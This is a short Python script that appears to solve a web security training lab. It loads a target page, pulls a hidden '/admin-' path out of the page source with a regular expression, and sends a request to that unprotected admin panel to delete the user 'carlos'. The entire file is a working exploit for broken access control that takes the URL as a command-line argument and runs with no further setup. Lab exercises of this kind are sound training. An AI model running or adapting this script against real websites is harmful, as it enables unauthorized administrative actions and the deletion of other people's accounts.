import requests
import re
import sys

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python3 solution.py <url>")
        sys.exit(1)

burp_url = sys.argv[1]
burp_headers = {}
response = requests.get(burp_url, headers=burp_headers)
match = re.search(r"/admin-[a-z0-9]{6}", response.text)
admin_url = match.group(0)
admin_url_del = burp_url + admin_url +'/delete?username=carlos'
response2 = requests.get(admin_url_del, headers=burp_headers)
